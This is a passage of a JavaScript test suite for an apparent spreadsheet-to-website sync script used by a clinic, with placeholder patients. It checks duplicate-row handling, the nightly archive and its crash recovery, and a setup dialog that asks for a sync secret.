  // the whole tab reads empty (an accident, or the nightly clear): wait three ticks before believing it, and then remove nothing
  const w4 = world({ rows: { [GUL]: rows.slice(0, 2) }, patients });
  settle(w4.env, 3);
  w4.env.deleteRows(GUL, 2, 2);
  const sentBefore = w4.server.calls.length;
  w4.env.ticks(2);
  assert.equal(w4.server.calls.length, sentBefore, 'an empty tab is not sent for the first two minutes');
  assert.equal(w4.server.state.visits.length, 2);
  w4.env.ticks(1);
  assert.equal(w4.server.state.visits.length, 2, 'and when it is sent, two visits vanishing at once are put back');
});

test('a whole row copied (hidden key too) is a pure copy: it says "Duplicate of row N", is never sent, and keeps the key; typed over with somebody else it gets a new key', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const sh = env.tab(GUL);
  const copy = sh.row(r);
  copy.forEach((v, i) => { if (v !== '') sh._set(9, i + 1, { kind: 's', v }); });
  env.touch();
  env.advance(61000);
  const from = server.calls.length;
  env.ticks(2);
  assert.equal(server.state.visits.filter((v) => server.patientByMr(v.mr).name === 'Sample Person One').length, 1);
  assert.equal(statusOf(env, GUL, 9), '✗ Duplicate of row 2: delete this row.', 'sheet-behaviour RV-1 (before: re-keyed, sent and refused as "Already on this list")');
  assert.equal(sentRowsSince(server, from).length, 0, 'nothing sent for it');
  assert.equal(sh.text(9, colOf(env, GUL, 'sync key')), sh.text(2, colOf(env, GUL, 'sync key')), 'the copy keeps the key');
  assert.equal(statusOf(env, GUL, 2), '✓ On website', 'the original is not disturbed');
  // the copy typed over with another patient is that patient's new row
  server.addPatient({ mr: '9790', name: 'Sample Person Ninety', phone: '03001110090' });
  setCell(env, GUL, 9, 'mr', '9790');
  setCell(env, GUL, 9, 'patients name', 'Sample Person Ninety');
  setCell(env, GUL, 9, 'contact', '03001110090');
  settle(env, 3);
  assert.equal(visitsOfPatient(server, 'Sample Person Ninety').length, 1);
  assert.notEqual(sh.text(9, colOf(env, GUL, 'sync key')), sh.text(2, colOf(env, GUL, 'sync key')), 'a new key');
  assert.equal(server.state.visits.filter((v) => server.patientByMr(v.mr).name === 'Sample Person One').length, 1);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
});

test('two different people typed with the same Mr# (a real case in the DHA tab): the second row is refused, nothing is merged', () => {
  const { env, server } = world({ tabs: ['DHA KHI'], patients: [{ mr: '8641', name: 'Sample Person Nine', phone: '03001110009' }] });
  settle(env, 3);
  assert.equal(server.state.visits.length, 1);
  assert.equal(statusOf(env, 'DHA KHI', 2), '✓ On website');
  // (11 Oct 2026) the second name only fits the Mr# with doubt (another last word): refused before anything is looked up on the list
  assert.equal(statusOf(env, 'DHA KHI', 3), '✗ Needs attention: the name in this row does not match Mr# 8641 on the website. Check the Mr#, or type the name as the website has it.');
  assert.equal(cellOf(env, 'DHA KHI', 3, 'patient'), 'Sample Person Ten');
  assert.equal(cellOf(env, 'DHA KHI', 3, 'treatment details'), 'U018 Upper Pc', 'the second row\'s text is untouched');
});

test('changing the Mr# of a row to another patient never moves the visit: the old visit stays with its patient, the row becomes a new row', () => {
  const { env, server } = synced();
  server.addPatient({ mr: '9750', name: 'Sample Person Fifty', phone: '03001110050' });
  const r = rowOf(env, GUL, 'Sample Person One');
  const v1 = webVisit(server, 'Sample Person One');
  setCell(env, GUL, r, 'patients name', 'Sample Person Fifty');
  setCell(env, GUL, r, 'mr', '9750');
  env.advance(61000);
  env.ticks(3);
  assert.equal(v1.mr, '9701', 'the visit did not change patient');
  assert.equal(visitsOfPatient(server, 'Sample Person Fifty').length, 1, 'the new patient has a visit of their own');
  assert.equal(v1.status, 'completed', 'the old visit stays (a completed visit is never cancelled by the sheet)');
  assert.ok(rowOf(env, GUL, 'Sample Person One') > 7, 'and its row is put back at the bottom');
});

test('rows sorted with only the visible columns (hidden key columns left behind) heal: every patient keeps exactly one visit', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');                 // the visible data columns are 1..kc-1
  const before = server.state.visits.length;
  const rows = [2, 3, 4, 6, 7].map((r) => sh.row(r).slice(0, kc - 1));
  rows.reverse();
  [2, 3, 4, 6, 7].forEach((r, i) => rows[i].forEach((v, c) => { sh._set(r, c + 1, v === '' ? null : { kind: /^\d+$/.test(v) ? 'n' : 's', v: /^\d+$/.test(v) ? Number(v) : v }); }));
  env.touch();
  env.advance(61000);
  env.ticks(4);
  assert.equal(server.state.visits.length, before, 'no visit created, none lost');
  const names = new Map();
  for (const v of server.state.visits) names.set(v.mr, (names.get(v.mr) || 0) + 1);
  assert.ok([...names.values()].every((n) => n === 1), 'one visit per patient');
  assert.ok(server.state.visits.every((v) => v.status !== 'cancelled'));
  for (const r of [2, 3, 4, 6, 7]) assert.ok(/^✓|^⚠/.test(statusOf(env, GUL, r)), `row ${r}: ${statusOf(env, GUL, r)}`);
  quiet(env, server);
});

// ------------------------------------------------------------------------------------------------ the nightly archive
const NEXT = '2026-10-10';
/** a synced Gulshan tab at 23:58 with a website-only visit that has been added to the sheet */
function dayEnd(opts = {}) {
  const w = synced(opts);
  w.server.addPatient({ mr: '9799', name: 'Website Walker', phone: '03001110099' });
  w.server.addVisit({ branch: 'GUL', date: TODAY, mr: '9799', status: 'waiting', token: 7 });
  w.env.at(TODAY, '23:58');
  w.env.ticks(1);
  assert.equal(rowOf(w.env, GUL, 'Website Walker'), 8);
  return w;
}
const archiveSheet = (env, tab = GUL) => { const b = env.archiveBooks()[0]; return b && b.getSheetByName(tab); };
const ckSheet = (env) => env.checkupBook && env.checkupBook.getSheetByName('Aj ki List checkups');
const dataCells = (env, tab = GUL) => {   // every non-empty cell below the header, left of the helper columns
  const sh = env.tab(tab), w = colOf(env, tab, 'website'), out = [];
  for (let r = 2; r <= sh.used().rows; r++) { const row = []; for (let c = 1; c < w; c++) row.push(sh.text(r, c)); if (row.some((x) => x !== '')) out.push(row); }
  return out;
};

test('midnight: the day is sent one last time, copied to "Aj ki List - Archive" with its date, the tab is cleared down to the header, a new list starts', () => {
  const { env, server } = dayEnd();
  const before = dataCells(env);
  assert.equal(before.length, 7);
  const headerBefore = env.tab(GUL).row(1);
  env.at(NEXT, '00:05');
  env.ticks(1);
  // the last flush: for yesterday, with whatever was typed, no removal check
  const last = server.calls[server.calls.length - 1];
  assert.equal(last.payload.date, TODAY);
  assert.equal(last.payload.check_removed, false);
  // the archive
  const books = env.archiveBooks();
  assert.equal(books.length, 1);
  assert.equal(books[0].getName(), 'Aj ki List - Archive');
  const arch = archiveSheet(env);
  assert.deepEqual(arch.row(1), ['Date', 'MR #', 'Patients Name', 'Months', 'Treatment', 'Token', 'Waiting', 'Group', 'Doctor Name', 'Treatment Details', 'P.P', 'Healthwire', 'Contact No', 'Reminder Status', 'Website visit id', 'Archived at']);
  assert.equal(arch.used().rows, 8, 'header + 7 rows');
  for (let r = 2; r <= 8; r++) { assert.equal(arch.text(r, 1), TODAY); assert.equal(arch.kind(r, 1), 's'); }
  const archived = []; for (let r = 2; r <= 8; r++) archived.push(arch.row(r).slice(1, 14));
  assert.deepEqual(archived, before, 'every cell, exactly as it was on the sheet (phones keep their 0)');
  assert.equal(arch.text(2, 15), webVisit(server, 'Sample Person One').id, 'the website\'s visit id travels with the row');
  assert.match(arch.text(2, 16), /^2026-10-10 00:0\d$/);
  // the working tab: header kept, everything else empty, hidden columns still hidden
  const sh = env.tab(GUL);
  assert.equal(dataCells(env).length, 0);
  assert.deepEqual(sh.row(1).slice(0, 13), headerBefore.slice(0, 13));
  for (let r = 2; r <= 12; r++) for (let c = 1; c <= sh.used().cols; c++) assert.equal(sh.text(r, c), '', `cleared ${r},${c}`);
  assert.equal(sh.font(2, colOf(env, GUL, 'website')), null);
  for (const l of ['sync key', 'sync base', 'sync edited']) assert.ok(sh.isColumnHiddenByUser ? sh.hidden.has(colOf(env, GUL, l)) : true);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  assert.ok(![...env.props.document.keys()].some((k) => k.startsWith('arch:') || k.startsWith('hash:')), 'marker and hash are gone');
  assert.match(headerOf(env, GUL), /new list for 2026-10-10/);
  // the website keeps the day too: nothing was deleted there
  assert.equal(server.visitsOf('GUL', TODAY).length, 7);
});

test('the archive can be brought back into the website with Admin -> Import: its Date column makes the reader treat every row as a dated day', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  env.ticks(1);
  const t = web.readTab(archiveSheet(env).values());
  assert.equal(t.dateMode, 'column');
  assert.deepEqual(t.days, [TODAY]);
  assert.equal(t.rows.length, 7);
  assert.deepEqual(t.rows.map((r) => r.name).slice(0, 2), ['Sample Person One', 'Sample Person Two']);
  assert.equal(t.rows[0].phone, '03001110001');
});

test('the next morning the empty tab starts a new day: new rows go with the new date, and the website-only visits of the new day are added', () => {
  const { env, server } = dayEnd();
  env.at(NEXT, '00:05');
  env.ticks(1);
  env.at(NEXT, '08:00');
  server.addPatient({ mr: '9801', name: 'Morning Mary', phone: '03001110801' });
  env.typeRow(GUL, 2, ['9801', 'Morning Mary', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  server.addPatient({ mr: '9802', name: 'Early Eddy', phone: '03001110802' });
  server.addVisit({ branch: 'GUL', date: NEXT, mr: '9802', status: 'waiting' });
  env.tickAfter(61000);
  env.ticks(4);
  assert.deepEqual(server.calls[server.calls.length - 1].payload.date, NEXT);
  assert.equal(server.visitsOf('GUL', NEXT).length, 2);
  assert.equal(server.visitsOf('GUL', TODAY).length, 7, 'yesterday\'s visits were not touched');
  assert.equal(rowOf(env, GUL, 'Morning Mary'), 2);
  assert.ok(rowOf(env, GUL, 'Early Eddy') > 2, 'the website\'s visit was added');
  assert.ok(server.calls.every((c) => !c.payload.tabs.some((t) => t.rows.some((r) => r.set.name === 'Sample Person One') && c.payload.date === NEXT)), 'yesterday\'s patients are never sent as today\'s');
});

test('a crash between the copy and the clear: the next tick finishes the clear, does not copy again, and keeps rows typed after the copy', () => {
  const { env, server } = dayEnd();
  env.at(NEXT, '00:05');
  const orig = env.Range.prototype.clearContent;
  env.Range.prototype.clearContent = function () { env.Range.prototype.clearContent = orig; throw new Error('Service error: Spreadsheets'); };
  env.ticks(1);
  assert.equal(archiveSheet(env).used().rows, 8, 'copied');
  assert.equal(dataCells(env).length, 7, 'but not cleared');
  assert.ok(env.props.document.get('arch:' + GUL), 'the marker says "copied"');
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY, 'still the old day');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Archive problem/);
  // someone starts the new day's list before the next tick
  env.typeRow(GUL, 10, ['', 'Early Bird', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110900', '']);
  env.ticks(1);
  assert.equal(archiveSheet(env).used().rows, 8, 'not copied twice');
  assert.deepEqual(dataCells(env).map((r) => r[1]), ['Early Bird'], 'only the old rows were cleared');
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  assert.equal(env.tab(GUL).text(10, 2), 'Early Bird');
  // at 08:00 the early bird is a row of the new day
  env.at(NEXT, '08:00');
  env.tickAfter(61000);
  env.ticks(2);
  assert.equal(server.checkupsOf('GUL', NEXT).length, 1);
  assert.equal(server.checkupsOf('GUL', NEXT)[0].name, 'Early Bird');
});

test('a row edited after it was copied but before it was cleared is not lost: it is copied again, then cleared', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  const orig = env.Range.prototype.clearContent;
  env.Range.prototype.clearContent = function () { env.Range.prototype.clearContent = orig; throw new Error('Service error: Spreadsheets'); };
  env.ticks(1);
  setCell(env, GUL, 3, 'treatment details', 'typed at 00:06');
  env.ticks(1);
  const arch = archiveSheet(env);
  assert.equal(arch.used().rows, 9, 'one more line: the edited row again');
  assert.equal(arch.text(9, 10), 'typed at 00:06');
  assert.equal(dataCells(env).length, 1, 'everything else was cleared; the edited row waits');
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY);
  env.ticks(1);
  assert.equal(dataCells(env).length, 0);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
});

test('the archive waits for quiet: a row edited a moment ago holds it back until 60 s have passed (or 00:30)', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  setCell(env, GUL, 3, 'reminder', 'last second');
  env.tickAfter(20000);
  assert.equal(env.archiveBooks().length, 0, 'nothing copied yet');
  assert.equal(dataCells(env).length, 7);
  env.tickAfter(61000);
  assert.equal(archiveSheet(env).used().rows, 8);
  // the wait never lasts beyond 00:30
  const w = dayEnd();
  w.env.at(NEXT, '00:31');
  w.env.type(GUL, 3, colOf(w.env, GUL, 'reminder'), 'typing at 00:31');
  w.env.tickAfter(5000);
  assert.equal(archiveSheet(w.env).used().rows, 8, 'archived although a row was edited 5 s ago');
});

test('rows typed up to the last minute are sent in the final flush (no settle wait) and reach the archive and the website', () => {
  const { env, server } = dayEnd();
  env.at(TODAY, '23:59');
  env.advance(30000);
  env.typeRow(GUL, 9, ['', 'Last Minute', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110955', '']);
  env.at(NEXT, '00:31');                                 // 31 minutes later; the archive waited for nothing
  env.tick();
  assert.equal(server.checkupsOf('GUL', TODAY).length, 1, 'the website has the last-minute checkup for yesterday');
  const arch = archiveSheet(env);
  assert.ok(arch.values().some((r) => r[2] === 'Last Minute'));
  assert.equal(arch.values().find((r) => r[2] === 'Last Minute')[1], '', 'a checkup patient has no Mr#');
});

test('the script was off all night: at 08:00 yesterday\'s rows are archived WITHOUT being sent as today\'s; then today starts clean', () => {
  const { env, server } = synced();
  env.at(TODAY, '17:00');
  env.ticks(1);
  const visitsBefore = server.state.visits.length;
  const callsBefore = server.calls.length;
  env.at(NEXT, '08:00');                                 // nothing ran after 17:00
  env.ticks(2);
  assert.equal(server.state.visits.length, visitsBefore, 'no visit created for the new day from yesterday\'s rows');
  for (const c of server.calls.slice(callsBefore)) {
    assert.equal(c.payload.date, NEXT);
    assert.ok(c.payload.tabs.every((t) => t.rows.length === 0), 'no rows sent');
  }
  assert.equal(archiveSheet(env).used().rows, 7, 'the 6 rows of 09-10 are in the archive (header + 6)');
  assert.equal(archiveSheet(env).text(2, 1), TODAY);
  assert.equal(dataCells(env).length, 0);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Rows for 2026-10-09 archived without a final sync/);
});

test('nothing is ever cleared that was not copied: stray cells far below the list (a "P.P" at row 146, "Group" at 899) are archived with the rest', () => {
  const { env } = world({ tabs: ['DHA KHI'], patients: [{ mr: '8641', name: 'Sample Person Nine', phone: '03001110009' }] });
  const sh = env.tab('DHA KHI');
  sh.maxRows = 1100;
  for (const [r, c, v] of fixture.stray['DHA KHI']) sh._set(r, c, { kind: 's', v });
  const before = []; for (let r = 2; r <= sh.used().rows; r++) { const row = sh.row(r).slice(0, 13); if (row.some((x) => x)) before.push(row); }
  settle(env, 3);
  env.at(NEXT, '00:05');
  env.ticks(1);
  const arch = env.archiveBooks()[0].getSheetByName('DHA KHI');
  const kept = []; for (let r = 2; r <= arch.used().rows; r++) kept.push(arch.row(r).slice(1, 14));
  for (const row of before) assert.ok(kept.some((k) => JSON.stringify(k.map(String)) === JSON.stringify(row.map(String))), 'archived: ' + row.join('|'));
  assert.equal(dataCells(env, 'DHA KHI').length, 0, 'and now cleared');
  assert.equal(sh.text(997, 7), '');
});

test('a big day (130 rows) is archived and cleared through a marker that fits in Google\'s 9 KB property limit; a crash still resumes', () => {
  const rows = [], patients = [];
  for (let i = 0; i < 130; i++) {
    patients.push({ mr: String(20000 + i), name: `Walk In ${i + 1}`, phone: `0301${String(3000000 + i).slice(1)}` });
    rows.push([String(20000 + i), `Walk In ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0301${String(3000000 + i).slice(1)}`, '']);
  }
  const { env, server } = world({ patients, rows: { [GUL]: rows } });
  env.ticks(1); env.advance(61000); env.ticks(8);
  assert.equal(server.state.visits.length, 130);
  env.at(NEXT, '00:05');
  const orig = env.Range.prototype.clearContent;
  env.Range.prototype.clearContent = function () { env.Range.prototype.clearContent = orig; throw new Error('Service error: Spreadsheets'); };
  env.ticks(1);
  const chunks = [...env.props.document.keys()].filter((k) => k.startsWith('arch:' + GUL + ':'));
  assert.ok(chunks.length >= 3, 'the marker is split over several properties');
  for (const k of chunks) assert.ok(env.props.document.get(k).length < 9 * 1024);
  env.ticks(1);
  assert.equal(archiveSheet(env).used().rows, 131);
  assert.equal(dataCells(env).length, 0);
  assert.ok(![...env.props.document.keys()].some((k) => k.startsWith('arch:')));
});

test('the archive spreadsheet is made once and reused every night; a renamed header becomes a new archive column; a lost archive is replaced and the loss logged', () => {
  const { env, server } = dayEnd();
  env.at(NEXT, '00:05');
  env.ticks(1);
  const id = env.props.document.get('archiveId');
  assert.ok(id);
  // day two: a header was renamed ("Reminder Status" -> "Reminder"), one patient typed
  server.addPatient({ mr: '9801', name: 'Day Two', phone: '03001110801' });
  env.at(NEXT, '09:00');
  env.tab(GUL).hidden.size;
  const rc = colOf(env, GUL, 'reminder');
  env.tab(GUL)._set(1, rc, { kind: 's', v: 'Reminder' });
  env.typeRow(GUL, 2, ['9801', 'Day Two', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', 'Called']);
  env.tickAfter(61000);
  env.ticks(2);
  env.at('2026-10-11', '00:05');
  env.ticks(1);
  assert.equal(env.props.document.get('archiveId'), id, 'the same archive spreadsheet');
  assert.equal(env.archiveBooks().length, 1);
  const arch = archiveSheet(env);
  assert.equal(arch.used().rows, 9, 'the second night is added under the first: header + 7 + 1');
  assert.equal(arch.text(9, 1), NEXT);
  assert.equal(arch.text(9, 3), 'Day Two');
  const head = arch.row(1);
  assert.equal(head[head.length - 1], 'Reminder', 'a header the archive had not seen is added at the end');
  assert.equal(arch.text(9, head.length), 'Called', 'and the data is filed under it');
  assert.equal(arch.text(2, 3), 'Sample Person One', 'the first night\'s lines are where they were');
  // the archive is deleted by accident: a new one is made, and it is logged
  env.books.splice(env.books.indexOf(env.archiveBooks()[0]), 1);
  env.typeRow(GUL, 2, ['9801', 'Day Three', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.at('2026-10-12', '00:05');
  env.ticks(1);
  assert.equal(env.archiveBooks().length, 1);
  assert.notEqual(env.props.document.get('archiveId'), id);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /archive spreadsheet could not be opened/);
});

// ------------------------------------------------------------------------------------------------ set up (Dr. Ali, once)
const ALL_PATIENTS = [
  { mr: '9701', name: 'Sample Person One', phone: '03001110001' }, { mr: '146', name: 'Sample Person Two', phone: '03001110002' },
  { mr: '9703', name: 'Sample Person Six', phone: '03001110006' }, { mr: '9711', name: 'Sample Person Seven', phone: '03001110007' },
  { mr: '8641', name: 'Sample Person Nine', phone: '03001110009' }, { mr: '9721', name: 'Sample Person Eleven', phone: '03001110011' },
  { mr: '9722', name: 'Sample Person Thirteen', phone: '03001110013' }, { mr: '9731', name: 'Sample Person Fourteen', phone: '03001110014' },
  { mr: '9732', name: 'Sample Person Fifteen', phone: '03001110015' },
];
/** answers to the questions Set up asks. days: the texts typed for "which day" (per tab), old: answer to "turn the old timer off", sure: answer to "are these really today's patients?" (asked when an empty answer meets Completed rows) */
function scripted(env, { secret = SECRET, keep = 'YES', days = {}, old = 'YES', sure = 'YES' } = {}) {
  const queues = {};
  for (const [tab, list] of Object.entries(days)) queues[tab] = (Array.isArray(list) ? list : [list]).slice();
  env.responder = (d) => {
    if (d.kind === 'prompt' && /sync secret/i.test(d.text)) return { button: 'OK', text: secret };
    if (d.kind === 'prompt' && /Which day/.test(d.text)) {           // one question per tab: the day its rows are from (empty = today)
      const q = queues[d.title];
      if (!q) return { button: 'OK', text: '' };
      if (q[0] === 'CANCEL') return { button: 'CANCEL', text: '' };
      return { button: 'OK', text: q.length ? q.shift() : '' };
    }
    if (d.kind === 'alert' && /Keep the saved sync secret/.test(d.text)) return keep;
    if (d.kind === 'alert' && /other timer/.test(d.text)) return old;
    if (d.kind === 'alert' && /marked Completed/.test(d.text)) return typeof sure === 'function' ? sure(d) : sure;
    if (d.kind === 'alert' && d.buttons === 'OK') return 'OK';
    return undefined;
  };
}
const ours = (env) => env.triggers.filter((t) => ['aajSyncTick', 'aajOnEdit', 'aajOnChange', 'aajOnOpen'].includes(t.handler));

test('Set up (Dr. Ali): the secret, a question for each tab, the old timer, the triggers, the archive, one tick: and nothing is doubled on the website', () => {
  const { env, server } = world({ tabs: TABS, patients: ALL_PATIENTS, install: false, helpers: false });
  // the website already has some of today's patients (entered there before the sheet was connected)
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9701', status: 'waiting', token: 1 });
  server.addVisit({ branch: 'NN', date: TODAY, mr: '9711', status: 'completed', token: 1 });
  server.addVisit({ branch: 'ISB', date: TODAY, mr: '9731', status: 'waiting' });
  env.triggers.push({ handler: 'copyWebsiteTabs', id: 'old-export', source: 'CLOCK', event: 'CLOCK', every: 1 });
  scripted(env);
  env.ctx.aajSetup();
  // the dialogs, in order
  const kinds = env.dialogs.map((d) => `${d.kind}:${d.title || d.text.slice(0, 20)}`);
  assert.equal(env.dialogs[0].kind, 'prompt');
  assert.match(env.dialogs[0].text, /^Paste the sync secret from the file you were given$/);
  const tabQ = env.dialogs.filter((d) => d.kind === 'prompt' && /Which day/.test(d.text));
  assert.deepEqual(tabQ.map((d) => d.title), TABS);
  assert.equal(tabQ[0].text, '6 patients are on this tab now (first: Sample Person One, last: Sample Person Six).\n\nWhich day are they from? Type it like 06-10-2026. Leave it empty for TODAY (Fri 09 Oct).');
  const oldQ = env.dialogs.find((d) => /other timer/.test(d.text));
  assert.equal(oldQ.text, 'Found 1 other timer(s): copyWebsiteTabs. They are probably the old copy into the "Website - ..." tabs. Turn them off?');
  const last = env.dialogs[env.dialogs.length - 1];
  assert.match(last.text, /^Done\. The "Website" column shows a tick when a row is on the website\.\nArchive: https:\/\/docs\.google\.com\/spreadsheets\/d\/book-\d+\/edit$/);
  // what it left behind
  assert.equal(env.props.user.get('AAJ_SYNC_SECRET'), SECRET, 'the secret is in the owner\'s own properties');
  assert.ok(![...env.props.script.keys()].length, 'not in script properties, which every editor of the sheet can read');
  for (const t of TABS) assert.equal(env.props.document.get('listDate:' + t), TODAY);
  assert.deepEqual(env.triggers.map((t) => t.handler).sort(), ['aajOnChange', 'aajOnEdit', 'aajOnOpen', 'aajSyncTick'], 'the old timer is gone, ours are in');
  const tick = env.triggers.find((t) => t.handler === 'aajSyncTick');
  assert.equal(tick.event, 'CLOCK'); assert.equal(tick.every, 1);
  assert.equal(env.triggers.find((t) => t.handler === 'aajOnEdit').event, 'ON_EDIT');
  assert.equal(env.triggers.find((t) => t.handler === 'aajOnChange').event, 'ON_CHANGE', 'a deleted row fires "on change", not "on edit"');
  assert.equal(env.triggers.find((t) => t.handler === 'aajOnOpen').event, 'ON_OPEN');
  assert.ok(env.tab('Aaj Sync log'), 'log tab');
  assert.equal(env.archiveBooks().length, 1);
  assert.equal(env.menus[0].name, 'Aaj Sync');
  assert.deepEqual(env.menus[0].items.map((i) => i.fn), ['aajSyncNow', 'aajSetup', 'aajShowArchive', 'aajStatus', 'aajHelp']);
  // helper columns: right after the last header, the last three hidden; NN has Column 13/14/16 so its columns come after those
  const gul = env.tab(GUL), nn = env.tab('North Nazimabad');
  assert.deepEqual([14, 15, 16, 17].map((c) => gul.text(1, c).replace(/^Website.*/, 'Website')), ['Website', 'Sync key', 'Sync base', 'Sync edited']);
  assert.deepEqual([17, 18, 19, 20].map((c) => nn.text(1, c).replace(/^Website.*/, 'Website')), ['Website', 'Sync key', 'Sync base', 'Sync edited']);
  assert.deepEqual([...gul.hidden].sort((a, b) => a - b), [15, 16, 17]);
  assert.deepEqual([...nn.hidden].sort((a, b) => a - b), [18, 19, 20]);
  // the first tick ran and linked the rows to the website's existing visits: nothing doubled
  assert.ok(env.stats.fetches >= 1);
  env.ticks(2);
  const perPatient = new Map();
  for (const v of server.state.visits) { const k = v.branch + v.mr; perPatient.set(k, (perPatient.get(k) || 0) + 1); }
  assert.ok([...perPatient.values()].every((n) => n === 1), 'one visit per patient and branch: ' + JSON.stringify([...perPatient]));
  assert.equal(webVisit(server, 'Sample Person One').sheet_key, env.tab(GUL).text(2, 15), 'linked to the website visit that was already there');
  // the sheet's Completed (a row Set up stamped, no edit time) completes the website's Waiting visit: the status only moves forward (SB7-2)
  assert.equal(webVisit(server, 'Sample Person One').status, 'completed', 'a different status on the sheet is a normal two-way merge, not a doubling');
  assert.match(statusOf(env, GUL, 2), /^[✓⚠]/);
});

test('Set up again (repair): the saved secret is kept, tabs that already have their day are not asked again, our triggers are not doubled', () => {
  const { env } = world({ tabs: TABS, patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env);
  env.ctx.aajSetup();
  const asked = env.dialogs.length;
  env.dialogs.length = 0;
  scripted(env);
  env.ctx.aajSetup();
  assert.equal(env.dialogs.filter((d) => d.kind === 'prompt').length, 0, 'no secret asked for');
  assert.equal(env.dialogs.filter((d) => /Which day/.test(d.text)).length, 0, 'no tab asked about');
  assert.equal(env.dialogs.filter((d) => /other timer/.test(d.text)).length, 0);
  assert.equal(ours(env).length, 4, 'four triggers, not eight');
  assert.equal(env.archiveBooks().length, 1, 'one archive');
  assert.ok(asked > env.dialogs.length);
  // keeping "no" asks for the secret again
  env.dialogs.length = 0;
  scripted(env, { keep: 'NO', secret: SECRET });
  env.ctx.aajSetup();
  assert.equal(env.dialogs.filter((d) => d.kind === 'prompt').length, 1);
  assert.equal(ours(env).length, 4);
});

test('Set up, an earlier day: the tab is asked which day its rows are from (a bad date or a future day is asked again, empty means TODAY); archived under that day and cleared; no visit is created; no checkups are added to the checkup list', () => {
  const rows = [...fixture.rows[GUL]];
  const { env, server } = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env, { days: { [GUL]: ['31-02-2026', '10-10-2026', '8/10/2026'] } });
  env.ctx.aajSetup();
  const asks = env.dialogs.filter((d) => /Which day/.test(d.text));
  assert.equal(asks.length, 3, 'the impossible date and the future day were asked again');
  assert.ok(env.dialogs.some((d) => d.text === 'That day has not come yet.'));
  assert.equal(asks[0].text, '6 patients are on this tab now (first: Sample Person One, last: Sample Person Six).\n\nWhich day are they from? Type it like 06-10-2026. Leave it empty for TODAY (Fri 09 Oct).');
  const arch = archiveSheet(env);
  assert.equal(arch.used().rows, 7);
  assert.equal(arch.text(2, 1), '2026-10-08');
  assert.equal(dataCells(env).length, 0, 'the tab is empty, ready for today');
  assert.equal(server.state.visits.length, 0, 'no visits created for an earlier day');
  assert.equal(server.state.checkups.length, 0);
  assert.equal(ckSheet(env), null, 'the three rows without an Mr# were NOT added to the checkup list: that list is only fed at night, for the day just ended');
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(env.tab(GUL).row(1).slice(0, 13).join('|'), fixture.headers[GUL].join('|'), 'the header stays');
  // empty answer -> today: the rows are linked to the website's visits of today
  const w2 = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(w2.env, { days: { [GUL]: [''] } });
  w2.env.ctx.aajSetup();
  assert.equal(w2.env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(w2.env.archiveBooks().length, 1, 'only the (empty) archive spreadsheet made by Set up');
  assert.equal(archiveSheet(w2.env), null, 'and nothing archived');
  assert.equal(dataCells(w2.env).length, 6, 'the rows stay: they are today\'s');
});

test('Set up, a branch that was last open earlier (DHA: Tue 06-10): its tab is archived under that day, not as yesterday and not as today', () => {
  const { env, server } = world({ tabs: ['DHA KHI', 'North Nazimabad'], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env, { days: { 'DHA KHI': ['06-10-2026'], 'North Nazimabad': ['08-10-2026'] } });
  env.ctx.aajSetup();
  const dha = env.archiveBooks()[0].getSheetByName('DHA KHI'), nn = env.archiveBooks()[0].getSheetByName('North Nazimabad');
  assert.equal(dha.text(2, 1), '2026-10-06');
  assert.equal(nn.text(2, 1), '2026-10-08');
  assert.equal(server.state.visits.length, 0);
  assert.equal(env.props.document.get('listDate:DHA KHI'), TODAY);
});

test('Set up, answer Cancel: it stops there; the triggers are not installed', () => {
  const { env } = world({ tabs: TABS, patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env, { days: { 'North Nazimabad': 'CANCEL' } });
  env.ctx.aajSetup();
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY, 'the tab answered before the cancel is set');
  assert.equal(env.props.document.get('listDate:North Nazimabad'), undefined);
  assert.equal(env.props.document.get('listDate:DHA KHI'), undefined, 'later tabs are not asked');
  assert.equal(env.triggers.length, 0);
  assert.equal(env.archiveBooks().length, 0);
});

test('Set up with a wrong secret: "That secret is not right. Nothing was changed."; with the website down: says so; neither saves anything', () => {
  const { env, server } = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env, { secret: 'a-wrong-secret' });
  env.ctx.aajSetup();
  assert.equal(env.dialogs[env.dialogs.length - 1].text, 'That secret is not right. Nothing was changed.');
  assert.equal(env.props.user.get('AAJ_SYNC_SECRET'), undefined);
  assert.equal(env.props.document.size, 0);
  assert.equal(env.triggers.length, 0);
  assert.equal(env.tab(GUL).used().cols, 13, 'the tab was not touched');
  server.faults.down = 1;
  scripted(env);
  env.ctx.aajSetup();
  assert.match(env.dialogs[env.dialogs.length - 1].text, /^The website did not answer \(.*\)\. Nothing was changed\.$/);
  assert.equal(env.triggers.length, 0);
  assert.equal(env.props.user.get('AAJ_SYNC_SECRET'), undefined);
  // the secret test is the contract's own empty call
  const probe = JSON.parse(env.fetchLog[0].params.payload);
